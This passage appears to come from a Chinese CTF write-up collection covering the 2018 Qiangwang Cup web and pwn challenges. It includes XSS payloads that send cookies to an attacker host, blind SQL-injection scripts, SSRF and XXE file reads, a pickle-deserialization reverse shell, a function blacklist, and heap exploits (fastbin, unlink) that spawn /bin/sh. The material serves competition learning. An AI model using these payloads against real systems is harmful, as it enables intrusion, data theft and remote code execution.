reported "},"articals/2018qiangwang.html":{"url":"articals/2018qiangwang.html","title":"2018强网杯Web","keywords":"","body":"2018第二届强网杯 题目类型： 类型 年份 难度 官方赛事题 2018 难 题目下载： 暂无 网上公开WP： http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html https://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html https://xz.aliyun.com/t/2219 http://pupiles.com/qiangwangbei.html https://www.leadroyal.cn/?p=471 https://www.jianshu.com/p/655f956a11c2 https://blog.csdn.net/xiangshangbashaonian/article/details/83040839 https://bbs.pediy.com/thread-247020.htm 本站备份WP： 感谢作者：l3m0n、FlappyPig、Pupil、Snowleo、iqiqiya、leadroyal Web web签到 第一层： 这里可以用2个字符串绕过 param1=240610708&param2=QNKCDZO 第二层: 使用了强等于，那么使用数组绕过 param1[]=1&param2[]=2使用了强制字符串转化一番谷歌后发现这是去年BKPCTF改的一道题payload如下: Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 注：上述两个字符串其md5加密后密文相同。 Share your mind 这题必须要写一下自己的踩坑经历，首先进去浏览一下页面功能，有个提交bug页面的地方，还有个可以新建文章的地方 最后就是浏览文章(但是只能浏览自己发的文章)，首先想到的就是xss+csrf，新建一个文章引用一段JS然后发给bot，然后ajax请求admin的文章发回来。可是按照这个思路我们发现在新建文章页面我们的<>被过滤了，所以我们不能直接构造一个js。猜想能不能在report页面里进行xss，但是发现存在过滤，只能像自己网站的地址发起请求，但是”居然”可以绕过!!!!!!,payload: http://39.107.33.96:20000/index.php/report/ 于是无尽的踩坑之旅开始了，首先是bot返回结果没有cookie，一开始也没在意以为设置了httponly,(后来大致明白bot过程了,先check url-未读,然后add_cookie-已读，这里直接用标签其实是在add_cookie之前就返回了所以不带cookie)让他AJAX请求访问admin的文章，代码如下 var a = new XMLHttpRequest(); a.open('GET', 'index.php/view/article/1', false); a.send(null); b = a.responseText; (new Image()).src = 'http://xxxxx/?flag=' + escape(b); 结果bot返回结果是未登录，然后我就很懵逼，后来给了hint1:phantomjs/2.1.1结果这提示给了以后我就以为是日bot，各种谷歌找2.1.1的漏洞，一直到下午出了hint2:漏洞点不在report…推翻了一个下午的努力成果。一直到晚上我才想起来index页面有一个../static/js/bootstrap.min.js的相对路径引用 想起来寒假时候看的rpo，关于rpo的原理这里不想赘述了，给个连接 https://open.appscan.io/article-462.html 这里文章查看页面没有引用DOCTYPE html，所以存在rpo漏洞,新建一个文章,文章title为空(title不为空的时候会添加一个标签导致浏览器解析js的时候报错 内容输入js代码比如alert(1) 然后访问这 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 把635替换成你的文章代码,这里对于服务器来说访问的是 http://39.107.33.96:20000/index.php 但是对于浏览器来说他访问的就是 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php 然后这个时候浏览器会发起js请求去请求原本index.php会加载的../static/js/bootstrap.min.js就是向 http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php/../static/js/bootstrap.min.js 相当于 http://39.107.33.96:20000/index.php/view/article/635/static/bootstrap.min.js 这里访问的结果和访问 http://39.107.33.96:20000/index.php/view/article/635/ 也就是你的文章的内容是一样的(不明白的可以自己本地测试)，不同的是浏览器是以js引擎去解析你的文章的，也就是会把你的文章当成一段js去执行。所以这里就可以绕过<>的过滤执行xss了。 所以我们新建一个文章内容为 var a = new XMLHttpRequest(); a.open('GET', 'yourvpsip', false); a.send(null); 然后用浏览器访问 http://39.107.33.96:20000/index.php/view/article/22957/..%2f..%2f..%2f..%2findex.php 然后这里发现居然没有发起请求，查看源码发现是过滤了\"和'，然后我就自作聪明的用反引号，然后我就陷入了无尽的玄学道路，我发现本地浏览器，vsp就可以收到请求 但是提交给bot就收不到请求，然后我就一直在这里卡了超级长的时间，期间还问了出题人,bot等问题…直到晚上用String.fromCharCode才解决了这个玄学问题(这个点真心卡了我好久),后面就比较简单了收到请求后发现cookie有提示 联想到国赛的一道读取子目录cookie的题目 https://www.lorexxar.cn/2017/07/11/guosai2017/ 脚本拿来改了改就可以get子目录cookie了 var iframe = document.createElement(\"iframe\"); iframe.src = \"/QWB_f14g/QWB\"; iframe.id = \"frame\"; document.body.appendChild(iframe); iframe.onload = function (){ var c = document.getElementById('frame').contentWindow.document.cookie; var n0t = document.createElement(\"link\"); n0t.setAttribute(\"rel\", \"prefetch\"); n0t.setAttribute(\"href\", \"//xxx/?\" + c); document.head.appendChild(n0t); } 然后把所有引号之间的内容用String.fromcode()编码一下 Three hit 进去后发现功能很少，猜测二次注入，发现username有正则限制，那么测试age，发现必须整数，这里可以用16进制绕过，测试一番后发现是个盲注 找了个脚本改了下 import requests import binascii url_register = \"http://39.107.32.29:10000/index.php?func=register\" url_login = \"http://39.107.32.29:10000/index.php?func=login\" result = '[*]result:' for i in range(1, 65): for j in range(32, 127): age = \"1223 or ascii(substr((select flag from flag limit 1),{0},1))={1}#\".format(str(i), str(j)) age = binascii.hexlify(bytes(age, 'utf8')) age = \"0x\" + str(age, \"utf8\") username = \"pupiles{0}{1}\".format(str(i), str(j)) data = { \"username\": username, \"password\": \"123456\", \"age\": age } while True: try: resp1 = requests.post(url=url_register, data=data, allow_redirects=False) break except Exception as e: continue while True: try: resp2 = requests.post(url=url_login, data=data, allow_redirects=True) if \"123\" in resp2.text: result += chr(j) print(result) break except Exception as e: continue 盲注跑出flag Wechat 出题人给出了公众后后面的地址，查看微信公众号的SDK可以发现可以通过一些xml数据进行发送 import requests url = \"http://39.107.33.77/\" content = \"Test http://www.baidu.com TEAMKEY icq3be93d38562e68bc0a86368c2d6b2\" data = ''' 1348831860 1234567890123456 1 ''' % content print requests.post(url,data=data).content 通过提示存在注入，可以得到以下信息 1521882365 1234567890123456 绑定host: wc.qwb.com 的ip为39.107.33.77 其中message存在注入，限制的比较严格 POST /leave_message.php HTTP/1.1 Host: wc.qwb.com:8088 user=aaaaaaaaaaaaaaa&email=aaaa@qq.com&team=icq3be93d38562e68bc0a86368c2d6b2&message=1'-(sleep(ceil(pi())))-'1&submit=submit 比如sleep函数参数里面不能用数字，可以使用pi()来绕过，另外就是select from部分。 message=12333'-(if(ascii(substring((select@b:=group_concat(username)from{cl0und.adminuser}),%s,1))like'%s',sleep(pi()),0))-'1 这里字段都需要猜解，猜不到password字段 http://wc.qwb.com:8088/forgetpassword.php 利用密码找回功能，注入出code，找回管理员密码 进入后台后，发现有一段上传处，主要用于用户的头像上传。 文件上传后便会将图片的内容显示出来。 再往后面看htm中有一段注释。 其中urlink存在ssrf漏洞，没有限制协议以及后面的字符，当然大部分的特殊符号不能用，只能读取一些配置文件。 POST /getimg.php HTTP/1.1 Host: wc.qwb.com:8088 Cookie: PHPSESSID=cjq7naar02kajivdftljhj2h44 ------WebKitFormBoundaryOXFwabnsGhrKdxyn Content-Disposition: form-data; name=\"urlink\" file://wc.qwb.com:8088/etc/apache2/apache2.conf ------WebKitFormBoundaryOXFwabnsGhrKdxyn-- 读取到apache的配置文件，可以看到内容。很郁闷，比赛的时候读取了这个文件，但是base64的内容没取完整导致没看到这部分，还是需要细心… # # Port 23333 # Options Indexes FollowSymLinks # AllowOverride None # Require all granted # Here is a Bin with its libc # 剩下的就是文件读取pwn程序，然后pwnpwnpwn了，太菜了，不会做。 教育机构 这个题目其实特别懵逼，给了一个域名，还以为是要来一场真实环境渗透题，所以信息收集方面都做了。比如扫二级域名，扫端口，扫文件(一扫就被ban) 80端口看的实在懵逼，毫无头绪。就看了一下33899端口的东西，有一个.idea的泄露，但是并没有什么用。 http://39.107.33.75:33899/.idea/workspace.xml 内容被注释了一段xm调用实体的变量，有点想xxe。 还有一个地方就是提交评论的地方，但是无论怎么样写入都是alert(\"未知错误！！！请重试\") 传入数组的时候发现出现问题了。 comment处有被userdecode处理过，试一下xml头，就可以看到有报错，考点应该就是xxe。 通过盲xxe，可以获取到文件。 远程服务器布置一个1.xml \"> %int; %trick; comment再进行调用 %remote; ]> 获取一下/var/www/52dandan.cc/public_html/config.php 拿到了一半的flag Ok,you get the first part of flag : 5bdd3b0ba1fcb40 then you can do more to get more part of flag 这里出现了一个问题，就是获取/var/www/52dandan.cc/public_html/common.php的时候出现了Detected an entity reference loop错误。 查了一下资料，libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。php过滤器中提供了一个zlib.inflate压缩数据。 压缩：echo file_get_contents(\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\"); 解压：echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\"); 这样就可以获取到common.php文件源码了! 再获取一下机器的一些ip信息，其中arp信息中保留了一个内网地址 /proc/net/arp /etc/host IP address HW type Flags HW address Mask Device 192.168.223.18 0x1 0x2 02:42:c0:a8:df:12 * eth0 192.168.223.1 0x1 0x2 02:42:91:f9:c9:d4 * eth0 开放了一个80端口，test.php的shop参数存在注入 \"> %int; %trick; 做不动了，不想做了。 2333，学习了一个防止扫描器的姿势，如果扫描器爬到test.php，当然对一般的目录扫描效果不大，一般都是HEAD请求。 test.php know it then do it Python is the best language 1/2 http://39.107.32.29:20000 http://117.50.16.51:20000 下载地址 备用下载地址（密码：rtou） I'm learning the flask recently,and I think python is the best language in the world!don't you think so? Python is the best language 解法一 源码下载下来后，由于是基于flask框架，因此先看了看路由文件routes.py，大概如下： @app.before_request def before_request(): @app.teardown_request def shutdown_session(exception=None): @app.route('/', methods=\\['GET', 'POST'\\]) @app.route('/index', methods=\\['GET', 'POST'\\]) @login_required def index(): @app.route('/explore') @login_required def explore(): @app.route('/logout') def logout(): @app.route('/register', methods=\\['GET', 'POST'\\]) def register(): @app.route('/user/') @login_required def user(username): @app.route('/edit_profile', methods=\\['GET', 'POST'\\]) @login_required def edit_profile(): @app.route('/follow/') @login_required def follow(username): @app.route('/unfollow/') @login_required def unfollow(username): 这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。 @app.route('/register', methods=\\['GET', 'POST'\\]) def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegistrationForm() if form.validate\\_on\\_submit(): res = mysql.Add(\"user\", \\[\"NULL\", \"'%s'\" % form.username.data, \"'%s'\" % form.email.data, \"'%s'\" % generate\\_password\\_hash(form.password.data), \"''\", \"'%s'\" % now()\\]) if res == 1: flash('Congratulations, you are now a registered user!') return redirect(url_for('login')) return render_template('register.html', title='Register', form=form) 跟进RegistrationForm，定义在 forms.py的第20行: class RegistrationForm(FlaskForm): username = StringField('Username', validators=\\[DataRequired()\\]) email = StringField('Email', validators=\\[DataRequired(), Email()\\]) password = PasswordField('Password', validators=\\[DataRequired()\\]) password2 = PasswordField( 'Repeat Password', validators=\\[DataRequired(), EqualTo('password')\\]) submit = SubmitField('Register') def validate_username(self, username): if re.match(\"^\\[a-zA-Z0-9_\\]+$\", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One(\"user\", {\"username\": \"'%s'\" % username.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different username.') def validate_email(self, email): user = mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different email address.') 在这里可以很明显的看到两个验证函数有差别，validate_username在进行mysql.One前进行了正则匹配的过滤和审核，而validate_email仅仅通过validators=[DataRequired(), Email()]来匹配。 Email定义在wtforms.validators中，相关源码如下： class Email(Regexp): \"\"\" Validates an email address. Note that this uses a very primitive regular expression and should only be used in instances where you later verify by other means, such as email activation or lookups. :param message: Error message to raise in case of a validation error. \"\"\" def \\_\\_init\\_\\_(self, message=None): self.validate_hostname = HostnameValidation( require_tld=True, ) super(Email, self).\\_\\_init\\_\\_(r'^.+@(\\[^.@\\]\\[^@\\]+)$', re.IGNORECASE, message) def \\_\\_call\\_\\_(self, form, field): message = self.message if message is None: message = field.gettext('Invalid email address.') match = super(Email, self).\\_\\_call\\_\\_(form, field, message) if not self.validate_hostname(match.group(1)): raise ValidationError(message) 其正则规则为^.+@([^.@][^@]+)$，也就是说对email而言，即使提交如'\"#a@q.com包含单引号，双引号，注释符等敏感字符的形式也是能通过的。 回到validate_email验证函数中： def validate_email(self, email): user = mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different email address.') 跟入mysql.One，定义在others.py: \\# mysql.One(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\]) def One(self, tablename, where={}, feildname=\\[\"*\"\\], order=\"\", where_symbols=\"=\", l=\"and\"): \\# self.Sel(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\], \"\", \"=\", l) sql = self.Sel(tablename, where, feildname, order, where_symbols, l) try: res = self.db_session.execute(sql).fetchone() if res == None: return 0 return res except: return -1 跟入self.Sel: \\# self.Sel(\"user\", {\"email\": \"'%s'\" % email.data}, \\[\"id\"\\], \"\", \"=\", l) def Sel(self, tablename, where={}, feildname=\\[\"*\"\\], order=\"\", where_symbols=\"=\", l=\"and\"): sql = \"select \" sql += \"\".join(i + \",\" for i in feildname)\\[:-1\\] + \" \" sql += \"from \" + tablename + \" \" if where != {}: sql += \"where \" + \"\".join(i + \" \" + where_symbols + \" \" + str(where\\[i\\]) + \" \" + l + \" \" for i in where)\\[:-4\\] if order != \"\": sql += \"order by \" + \"\".join(i + \",\" for i in order)\\[:-1\\] return sql 最后拼接出来的sql语句如下： select id from user where email = 'your input email' 结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为test'/**/or/**/1=1#@test.com，则拼接后的sql语句为： select id from user where email = 'test'/**/or/**/1=1#@test.com' 可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到validate_username def validate_username(self, username): if re.match(\"^\\[a-zA-Z0-9_\\]+$\", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One(\"user\", {\"username\": \"'%s'\" % username.data}, \\[\"id\"\\]) if user != 0: raise ValidationError('Please use a different username.') 当查询为真时也即user != 0会出现信息Please use a different username.，结合这点构造出最后的exp.py： import requests from bs4 import BeautifulSoup url = \"http://39.107.32.29:20000/register\" r = requests.get(url) soup = BeautifulSoup(r.text,\"html5lib\") token = soup.find_all(id='csrf_token')\\[0\\].get(\"value\") notice = \"Please use a different email address.\" result = \"\" database = \"(SELECT/**/GROUP\\_CONCAT(schema\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)\" tables = \"(SELECT/**/GROUP\\_CONCAT(table\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\\_SCHEMA.TABLES/**/WHERE/**/TABLE\\_SCHEMA=DATABASE())\" columns = \"(SELECT/**/GROUP\\_CONCAT(column\\_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION\\_SCHEMA.COLUMNS/**/WHERE/**/TABLE\\_NAME=0x666c616161616167)\" data = \"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)\" for i in range(1,100): for j in range(32,127): payload = \"test'/**/or/**/ascii(substr(\"+ data +\",%d,1))=%d#/**/@chybeta.com\" % (i,j) print payload post_data = { 'csrf_token': token, 'username': 'a', 'email':payload, 'password':'a', 'password2':'a', 'submit':'Register' } r = requests.post(url,data=post_data) soup = BeautifulSoup(r.text,\"html5lib\") token = soup.find_all(id='csrf_token')\\[0\\].get(\"value\") if notice in r.text: result += chr(j) print result break 由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。 最后的flag：QWB{us1ng_val1dator_caut1ous} 解法二 接着进行代码审计。在others.py的最后有这样的内容： black\\_type\\_list = \\[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads\\] class FilterException(Exception): def \\_\\_init\\_\\_(self, value): super(FilterException, self).\\_\\_init\\_\\_( 'the callable object {value} is not allowed'.format(value=str(value))) def \\_hook\\_call(func): def wrapper(*args, **kwargs): print args\\[0\\].stack if args\\[0\\].stack\\[-2\\] in black\\_type\\_list: raise FilterException(args\\[0\\].stack\\[-2\\]) return func(*args, **kwargs) return wrapper def load(file): unpkler = Unpkler(file) unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() 我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。 先忽略unpkler.dispatch[REDUCE]这一行的内容。 from pickle import Unpickler as Unpkler def load(file): unpkler = Unpkler(file) \\# unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() 这里对file进行了反序列化，因此如果file可控即可造成危险。 用下面的脚本(exp4.py)进行序列化payload的生成： import os from pickle import Pickler as Pkler import commands class chybeta(object): def \\_\\_reduce\\_\\_(self): return (os.system,(\"whoami\",)) evil = chybeta() def dump(file): pkler = Pkler(file) pkler.dump(evil) with open(\"test\",\"wb\") as f: dump(f) 测试反序列化漏洞(exp5.py): from pickle import Unpickler as Unpkler from io import open as Open def LOAD(file): unpkler = Unpkler(file) return Unpkler(file).load() with Open(\"test\",\"rb\") as f: LOAD(f) 不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试： from os import * from sys import * from pickle import * from io import open as Open from pickle import Unpickler as Unpkler from pickle import Pickler as Pkler black\\_type\\_list = \\[eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads\\] class FilterException(Exception): def \\_\\_init\\_\\_(self, value): super(FilterException, self).\\_\\_init\\_\\_( 'the callable object {value} is not allowed'.format(value=str(value))) def \\_hook\\_call(func): def wrapper(*args, **kwargs): print args\\[0\\].stack if args\\[0\\].stack\\[-2\\] in black\\_type\\_list: raise FilterException(args\\[0\\].stack\\[-2\\]) return func(*args, **kwargs) return wrapper def LOAD(file): unpkler = Unpkler(file) unpkler.dispatch\\[REDUCE\\] = \\_hook\\_call(unpkler.dispatch\\[REDUCE\\]) return Unpkler(file).load() with Open(\"test\",\"rb\") as f: LOAD(f) 此时如果简单地想通过前一步生成的test来执行系统命令，会报错。 考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块： 因此改写生成序列化文件的exp4.py如下： import os from pickle import Unpickler as Unpkler from pickle import Pickler as Pkler import commands class chybeta(object): def \\_\\_reduce\\_\\_(self): return (commands.getoutput,(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\\\\\"127.0.0.1\\\\\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\[\\\\\"/bin/sh\\\\\",\\\\\"-i\\\\\"\\]);'\",)) evil = chybeta() def dump(file): pkler = Pkler(file) pkler.dump(evil) with open(\"test\",\"wb\") as f: dump(f) 同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用 不过该怎么控制源代码中的load(file)的file呢？通过全局搜索关键字，在Mycache.py的FileSystemCache类中有多次引用，比如定义在第137行的get方法： def get(self, key): filename = self.\\_get\\_filename(key) try: with open(filename, 'rb') as f: pickle_time = load(f) if pickle_time == 0 or pickle_time >= time(): a = load(f) return a else: os.remove(filename) return None except (IOError, OSError, PickleError): return None 跟入_get_filename方法： def \\_get\\_filename(self, key): if isinstance(key, text_type): key = key.encode('utf-8') \\# XXX unicode review hash = md5(key).hexdigest() return os.path.join(self._path, hash) 可以看到将传入的字符串key进行MD5，并将其返回。不过这个key在哪里定义？通过全局搜索，不难发现在Mysession.py的open_session中进行了调用： class FileSystemSessionInterface(SessionInterface): ... def \\_\\_init\\_\\_(self, cache_dir, threshold, mode, key_prefix=\"bdwsessions\", use_signer=False, permanent=True): self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode) self.key_prefix = key_prefix self.use_signer = use_signer self.permanent = permanent def open_session(self, app, request): \\# 从cookie中获取到sid \\# 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604 \\# sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604 sid = request.cookies.get(app.session\\_cookie\\_name) if not sid: sid = self.\\_generate\\_sid() return self.session_class(sid=sid, permanent=self.permanent) ... data = self.cache.get(self.key_prefix + sid) if data is not None: return self.session_class(data, sid=sid) return self.session_class(sid=sid, permanent=self.permanent) ... 其中self.key_prefix即为bdwsessions，因此假设cookie中的sesssion值为675b6ec7-95bd-411f-a59d-4c3dbchybeta，则self.key_prefix + sid即为bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta，然后这串字符串进行MD5得到的结果78f634977cbacf167dfd9656fe9dd5f3即为675b6ec7-95bd-411f-a59d-4c3dbchybeta对应的session文件名。 同时根据config.py: SQLALCHEMY\\_DATABASE\\_URI = \"mysql://root:password@localhost/flask?charset=utf8\" SESSION\\_FILE\\_DIR = \"/tmp/ffff\" 可以知道session文件的保存路径在/tmp/ffff，以及用户为root，因此具有文件导出的权限的可能性很大。 流程 结合Python is the best language 1中的sql注入漏洞，我们梳理出如下的攻击流程： 本地生成序列化文件，并且进行十六进制编码 通过sql注入漏洞outfile出session文件 访问index，同时带上session文件对应的session值，触发open_session中的self.cache.get，进行反序列化攻击 假设前面生成的序列化文件存在于/tmp/ffff/chybeta，建议使用mysql的hex转码来进行十六进制的转换: mysql> select hex(load_file('/tmp/ffff/chybeta')) into outfile '/tmp/ffff/exp'; Query OK, 1 row affected (0.00 sec) 以使用675b6ec7-95bd-411f-a59d-4c3dbchybeta作为cookie为例，则其session文件存在于/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3 在十六进制的序列化串前面添加0x，构造邮箱处的注入点： select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com' 也即在注册的邮箱处填入： test'/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com 点击submit后出现Please use a different email address.。 接着在burp中抓取访问index的包，并修改cookie为675b6ec7-95bd-411f-a59d-4c3dbchybeta，在自己的vps上监听对应的端口： flag：QWB{pyth0n1s1ntere3t1ng} 总结: wtforms.validators的Email类验证不完善 flask的session处理机制 python沙箱逃逸 python反序列化漏洞 一点“小小”的脑洞 Refference: P师傅：Python库WTForm过滤不严导致URLXSS漏洞 PWN silent 漏洞位置: del函数free掉堆块后没有清空指针造成了dangling_ptr。并且edit函数在使用时没有检查堆块是否已经free。 利用思路：利用UAF构造fastbin attack。申请堆块，释放堆块进入fastbin，edit释放的堆块，修改其中的fd到got表上去，再申请回来，修改got表。 Fastbin Attack 在malloc回来的时候会检查size位，看这个堆块是不是属于该Fastbin中，不过只检查低4字节，如果size位为61，那么检查时61-6f都能通过。 my-exp from pwn import * local = 1 if local: p = process('./silent') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') else: p = remote('39.107.32.132' , 10000)#nc 39.107.32.132 10000 libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') def add(length , text): p.sendline('1') sleep(0.3) p.sendline(str(length)) sleep(0.3) p.sendline(text) sleep(0.3) def dele(num): p.sendline('2') sleep(0.3) p.sendline(str(num)) sleep(0.3) def edit(num , text): p.sendline('3') sleep(0.3) p.sendline(str(num)) sleep(0.3) p.sendline(text) sleep(0.3) p.sendline('') def debug(): print pidof(p)[0] raw_input() elf = ELF('./silent') p.recvuntil('==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.') fake_chunk = 0x601ffa system_plt = 0x400730 success('fake_chunk => ' + hex(fake_chunk)) success('system_plt => ' + hex(system_plt)) add(0x50 , 'a' * 0x4f)#chunk 0 rabbish add(0x50 , 'b' * 0x4f)#chunk 1 rabbish add(0x50 , 'c' * 0x4f) #debug() dele(0)#fastbin->chunk0 dele(1)#fastbin->chunk1->chunk0 debug() dele(0)#fastbin->chunk0->chunk1->chunk0 add(0x50 , p64(fake_chunk))#fastbin->chunk1->chunk0->0x601ffa fd add(0x50 , '/bin/sh\\x00')#fastbin->chunk0->0x601ffa rabbish add(0x50 , 'c' * 0x4f)#fastbin->0x601ffa command(chunk1) add(0x50 , 'A' * 0xe + p64(system_plt))#free=>system dele(1)#free(chunk1)=>system('/bin/sh\\x00') #debug() p.interactive() silent2 发现NX、Canary都开了，但Partial RELRO说明可以修改got表，PIE说明没有地址随机化，就可以直接利用IDA中看到的地址，不需要计算libc偏移了 先看main函数 case1:功能就是create啦 注意到*&s[8*i] = v3这句，说明是用s这个数组来存储堆地址的，并且最多存储10个至少为0x80大小（或0x10）的堆 case2:功能就是删除delete 注意到free后没有给数组该元素设置为0，存在UAF漏洞 case3:功能是编辑edit 可惜这里长度不能自定义，只能根据原堆大小进行写数据，因此光看这里不存在溢出情况。 另外这里奇怪的是往0x602120的bss段中写入48个字符，或许这里也可以做文章，但我做的时候将他忽视。 看完源码后提出以下思路： 目的是执行system('/bin/sh')-->修改某个函数的（strlen或者free等）got表为system_plt-->利用unlink任意地址写 先至少建立5个堆，然后将第4个和第5个堆free掉（不懂的可以参考我在CSDN中的unlink），以在unlink中构成chunk3->chunk0->target_addr的篡改链 create(0x90,'aaaa')#0 create(0x90,'/bin/sh\\x00')#1 create(0x90,'cccc')#2 create(0x90,'dddd')#3 create(0x90,'eeee')#4 delete(3) delete(4) 然后利用UAF漏洞对第4、5个堆进行伪造 fd = p64(p_addr-0x18) bk = p64(p_addr-0x10) payload = p64(0) + p64(0x91) + fd + bk + 'a'*0x70 #3 pre_size + size + fd + bk + data payload +=p64(0x90) + p64(0xa0) #4 pre_size + size create(0x130,payload) 这里有个知识点，虽然说malloc后返回的不是头部而是data数据段了，但看源码后才明白需要修改这个头部才能unlink if (!prev_inuse(p)) { //检查size最低位，看是否空闲 prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); //将p前移prevsize个字节 unlink(av, p, bck, fwd); } 这里将指针前移的偏移量为prevsize，也即只能前移到该0x130大chunk的数据段初始位置，因此需要在这里伪造一个头部绕过unlink检查。 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); p64(0) + p64(0x91)，关键是这个0x91和0x90大小一致（最低位只表示是否空闲，对实际大小无影响） 接下来就是free来触发unlink了 #unlink delete(4) 这样一来，就完成了 chunk3->chunk0->target_addr的篡改链 接下去就是利用该篡改链修改函数got表了 这里可以选择strlen，也可以选择free，但最终触发的指令得相应改变了 modify(3,p64(free_got)) modify(0,p64(system_plt)) 先往chunk3中写入free_got的地址，这样chunk0中保存的就是free_got了 然后往chunk0中写入system_plt，这样就相当于往free_got中写入system_plt了 如此一来就成功修改got表了 最后就用free('/bin/sh')来触发system('/bin/sh')，由于开始时我就往chunk1中写入了bin/sh了，这里直接用就行了 delete(1) 成功渗透，O(∩_∩)O哈哈~ 最后贴上exp from pwn import * #p = process('./silent2') cn = remote('127.0.0.1',9527) def create(size, content): cn.sendline('1') cn.sendline(str(size)) cn.sendline(content) def modify(idx, content1): cn.sendline('3') cn.sendline(str(idx)) cn.sendline(content1) def delete(idx): cn.sendline('2') cn.sendline(str(idx)) print cn.recv() free_got = 0x602018 strlen_got = 0x602020 system_plt = 0x400730 p_addr = 0x6020d8 create(0x90,'aaaa')#0 create(0x90,'/bin/sh\\x00')#1 create(0x90,'cccc')#2 create(0x90,'dddd')#3 create(0x90,'eeee')#4 delete(3) delete(4) fd = p64(p_addr-0x18) bk = p64(p_addr-0x10) payload = p64(0) + p64(0x91) + fd + bk + 'a'*0x70#3 payload +=p64(0x90) + p64(0xa0)#4 create(0x130,payload) #unlink delete(4) modify(3,p64(free_got)) modify(0,p64(system_plt)) delete(1) cn.interactive() 补充： 满足两个条件就可以了: 1、实现unlink的条件 Chunk4: '\\x00'*8+p64(0x101)+p64(0x6020d8-0x18)+p64(0x6020d8-0x10)+'A'*(256-32) Chunk5: 